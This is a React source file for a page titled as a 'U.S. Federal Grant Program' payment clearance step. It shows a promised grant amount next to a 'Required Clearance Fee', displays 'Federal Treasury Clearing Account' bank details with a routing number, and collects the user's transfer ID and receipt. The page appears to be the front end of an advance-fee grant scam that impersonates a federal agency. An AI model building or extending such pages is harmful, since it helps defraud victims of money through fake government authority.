import { createFileRoute, useNavigate, Link } from "@tanstack/react-router";
import { SiteLayout } from "@/components/SiteLayout";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useState, useEffect } from "react";
import { getDashboardDataServerFn, confirmPaymentServerFn } from "@/lib/serverFunctions";
import { Alert, AlertDescription } from "@/components/ui/alert";
import {
  AlertCircle,
  CheckCircle,
  ShieldCheck,
  Building,
  CreditCard,
  Loader2,
  ArrowLeft,
  DollarSign,
  Clock,
  Send,
  FileCheck,
} from "lucide-react";

export const Route = createFileRoute("/payment-confirmation")({
  head: () => ({
    meta: [
      {
        title: "Payment Clearance & Delivery Confirmation — U.S. Federal Grant Program",
      },
    ],
  }),
  component: PaymentConfirmation,
});

interface UserData {
  firstName: string;
  lastName: string;
  email: string;
  refNumber: string;
  selectedPackage: string | null;
  grantAmount: number | null;
  feeAmount: number | null;
}

function PaymentConfirmation() {
  const navigate = useNavigate();
  const [userData, setUserData] = useState<UserData | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [transactionId, setTransactionId] = useState("");
  const [receiptFile, setReceiptFile] = useState<File | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [success, setSuccess] = useState("");
  const [hasPaymentOption, setHasPaymentOption] = useState("yes");

  useEffect(() => {
    const fetchData = async () => {
      try {
        const token = localStorage.getItem("token");
        if (!token) {
          navigate({ to: "/apply" });
          return;
        }

        const result = await getDashboardDataServerFn({ data: { token } });
        if (result.success && result.data) {
          const data = result.data as any;
          if (!data.selectedPackage) {
            setError("Please select a grant package on your dashboard first.");
            setTimeout(() => navigate({ to: "/dashboard" }), 2000);
            return;
          }
          setUserData({
            firstName: data.firstName,
            lastName: data.lastName,
            email: data.profile.email,
            refNumber: data.refNumber,
            selectedPackage: data.selectedPackage,
            grantAmount: data.grantAmount,
            feeAmount: data.feeAmount,
          });
        } else {
          setError(result.error || "Failed to load claim data");
        }
      } catch (err) {
        setError("Failed to load payment clearance page");
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, [navigate]);

  const handleSubmitPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitting(true);
    setError("");
    setSuccess("");

    if (!hasPaymentOption) {
      setError("Please select your payment verification status");
      setSubmitting(false);
      return;
    }

    if (hasPaymentOption === "yes" && !transactionId) {
      setError("Please enter your bank transfer reference / transaction ID");
      setSubmitting(false);
      return;
    }

    try {
      const token = localStorage.getItem("token");
      if (!token) {
        setError("Session expired. Please login again.");
        navigate({ to: "/apply" });
        return;
      }

      const result = await confirmPaymentServerFn({
        data: {
          token,
          transactionId: transactionId || "pending_verification",
          receiptPath: receiptFile ? receiptFile.name : undefined,
        },
      });

      if (result.success) {
        setSuccess(result.message);
        setTimeout(() => {
          navigate({ to: "/dashboard" });
        }, 2000);
      } else {
        setError(result.error || "Failed to submit payment confirmation");
      }
    } catch (err) {
      setError("An error occurred while processing payment confirmation");
    } finally {
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <SiteLayout>
        <div className="min-h-[70vh] bg-slate-100 flex items-center justify-center p-4">
          <div className="text-center bg-white p-8 rounded-xl shadow-lg border border-slate-200">
            <Loader2 className="w-10 h-10 animate-spin text-blue-900 mx-auto mb-3" />
            <p className="text-base font-semibold text-slate-800">
              Loading Official Payment Clearance Details...
            </p>
          </div>
        </div>
      </SiteLayout>
    );
  }

  if (!userData) {
    return (
      <SiteLayout>
        <div className="min-h-[70vh] bg-slate-100 p-6 flex items-center justify-center">
          <div className="max-w-md w-full">
            <Alert className="bg-red-50 border-red-300 text-red-900 shadow-md">
              <AlertCircle className="h-5 w-5 text-red-600" />
              <AlertDescription className="font-medium">{error}</AlertDescription>
            </Alert>
            <div className="mt-4 text-center">
              <Link to="/dashboard">
                <Button className="bg-blue-900 text-white">Return to Dashboard</Button>
              </Link>
            </div>
          </div>
        </div>
      </SiteLayout>
    );
  }

  return (
    <SiteLayout>
      <div className="min-h-screen bg-slate-100 py-10 px-4 sm:px-6 lg:px-8">
        <div className="max-w-3xl mx-auto space-y-6">
          {/* Back button */}
          <div>
            <Link
              to="/dashboard"
              className="inline-flex items-center gap-1.5 text-xs font-semibold text-blue-900 hover:text-blue-700 transition"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Back to Grant Dashboard</span>
            </Link>
          </div>

          {/* Header */}
          <div className="bg-gradient-to-r from-blue-950 to-blue-900 text-white p-6 sm:p-8 rounded-2xl shadow-xl text-center">
            <div className="inline-flex p-3 bg-blue-800/80 rounded-full text-amber-400 mb-3 ring-4 ring-blue-700/40">
              <ShieldCheck className="w-8 h-8" />
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold font-serif">
              Official Payment Clearance &amp; Delivery
            </h1>
            <p className="text-xs sm:text-sm text-blue-200 mt-1">
              Federal Grant Clearance &amp; Insured Dispatch Protocol
            </p>
          </div>

          {/* Alerts */}
          {error && (
            <Alert className="bg-red-50 border-red-300 text-red-900 shadow-sm">
              <AlertCircle className="h-5 w-5 text-red-600" />
              <AlertDescription className="font-semibold">{error}</AlertDescription>
            </Alert>
          )}

          {success && (
            <Alert className="bg-emerald-50 border-emerald-400 text-emerald-950 shadow-sm">
              <CheckCircle className="h-5 w-5 text-emerald-600" />
              <AlertDescription className="font-semibold">{success}</AlertDescription>
            </Alert>
          )}

          {/* Summary Card */}
          <Card className="p-6 sm:p-8 bg-white shadow-md border border-slate-200">
            <h2 className="text-lg font-bold font-serif text-blue-950 pb-3 mb-4 border-b border-slate-200 flex items-center gap-2">
              <FileCheck className="w-5 h-5 text-blue-900" />
              <span>Grant Allocation Summary</span>
            </h2>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 p-4 rounded-xl bg-slate-50 border border-slate-200 text-center">
              <div>
                <p className="text-[11px] font-bold text-slate-500 uppercase">Selected Tier</p>
                <p className="text-xl font-bold text-blue-950 mt-0.5">{userData.selectedPackage}</p>
              </div>
              <div className="border-t sm:border-t-0 sm:border-l sm:border-r border-slate-200 pt-2 sm:pt-0">
                <p className="text-[11px] font-bold text-slate-500 uppercase">Grant Amount</p>
                <p className="text-2xl font-extrabold text-emerald-700 mt-0.5">
                  ${userData.grantAmount?.toLocaleString()}
                </p>
              </div>
              <div className="border-t sm:border-t-0 border-slate-200 pt-2 sm:pt-0">
                <p className="text-[11px] font-bold text-slate-500 uppercase">Required Clearance Fee</p>
                <p className="text-xl font-extrabold text-amber-700 mt-0.5">${userData.feeAmount}</p>
              </div>
            </div>

            <div className="mt-4 text-xs text-slate-600 flex items-center justify-between">
              <span>Beneficiary: <strong>{userData.firstName} {userData.lastName}</strong></span>
              <span>Ref: <strong className="font-mono text-blue-900">{userData.refNumber}</strong></span>
            </div>
          </Card>

          {/* Bank Payment Details */}
          <Card className="p-6 sm:p-8 bg-white shadow-md border border-slate-200">
            <h2 className="text-lg font-bold font-serif text-blue-950 pb-3 mb-4 border-b border-slate-200 flex items-center gap-2">
              <Building className="w-5 h-5 text-blue-900" />
              <span>Federal Treasury Clearing Account Details</span>
            </h2>

            <div className="space-y-3 bg-slate-50 p-5 rounded-xl border border-slate-200 text-sm">
              <div className="flex justify-between items-center py-1.5 border-b border-slate-200">
                <span className="text-slate-500">Designated Bank:</span>
                <span className="font-bold text-slate-900">Federal Clearing House / Bank of America</span>
              </div>
              <div className="flex justify-between items-center py-1.5 border-b border-slate-200">
                <span className="text-slate-500">Account Title:</span>
                <span className="font-bold text-slate-900">U.S. Federal Grant Disbursement Fund</span>
              </div>
              <div className="flex justify-between items-center py-1.5 border-b border-slate-200">
                <span className="text-slate-500">Routing Number (ABA):</span>
                <span className="font-mono font-bold text-slate-900">021000021</span>
              </div>
              <div className="flex justify-between items-center py-1.5 border-b border-slate-200">
                <span className="text-slate-500">Account Reference:</span>
                <span className="font-mono font-bold text-blue-900 bg-blue-100 px-2 py-0.5 rounded">
                  {userData.refNumber}
                </span>
              </div>
              <div className="flex justify-between items-center py-1.5">
                <span className="text-slate-500">Amount Due:</span>
                <span className="font-extrabold text-lg text-emerald-700">${userData.feeAmount} USD</span>
              </div>
            </div>

            <p className="text-xs text-amber-800 bg-amber-50 border border-amber-200 rounded-lg p-3 mt-4">
              <strong>Mandatory:</strong> Please put your Reference Number (<strong>{userData.refNumber}</strong>) in the memo/reference field of your payment transfer so our dispatch officer can verify your package within 24 hours.
            </p>
          </Card>

          {/* Confirmation Form */}
          <Card className="p-6 sm:p-8 bg-white shadow-md border border-slate-200">
            <h2 className="text-lg font-bold font-serif text-blue-950 pb-3 mb-4 border-b border-slate-200 flex items-center gap-2">
              <CreditCard className="w-5 h-5 text-blue-900" />
              <span>Submit Payment Confirmation</span>
            </h2>

            <form onSubmit={handleSubmitPayment} className="space-y-5">
              <div>
                <Label htmlFor="transactionId" className="text-xs font-bold text-slate-700">
                  Bank Transfer Reference / Transaction ID <span className="text-red-500">*</span>
                </Label>
                <Input
                  id="transactionId"
                  placeholder="e.g. TXN-94827492 or Bank Confirmation Code"
                  value={transactionId}
                  onChange={(e) => setTransactionId(e.target.value)}
                  className="mt-1.5 text-sm"
                  required
                />
                <p className="text-[11px] text-slate-500 mt-1">
                  Enter the transaction ID or receipt reference from your transfer.
                </p>
              </div>

              <div>
                <Label htmlFor="receipt" className="text-xs font-bold text-slate-700">
                  Attach Payment Receipt (Optional)
                </Label>
                <input
                  id="receipt"
                  type="file"
                  accept=".pdf,.jpg,.jpeg,.png"
                  onChange={(e) => setReceiptFile(e.target.files?.[0] || null)}
                  className="mt-1.5 block w-full text-xs text-slate-500 file:mr-3 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-900 hover:file:bg-blue-100 cursor-pointer"
                />
              </div>

              <Button
                type="submit"
                disabled={submitting}
                className="w-full bg-blue-900 hover:bg-blue-800 text-white font-bold py-3 text-base shadow-lg transition flex items-center justify-center gap-2"
              >
                {submitting ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    <span>Verifying and Logging Payment...</span>
                  </>
                ) : (
                  <>
                    <Send className="w-4 h-4" />
                    <span>Confirm Payment &amp; Authorize Delivery</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>
    </SiteLayout>
  );
}
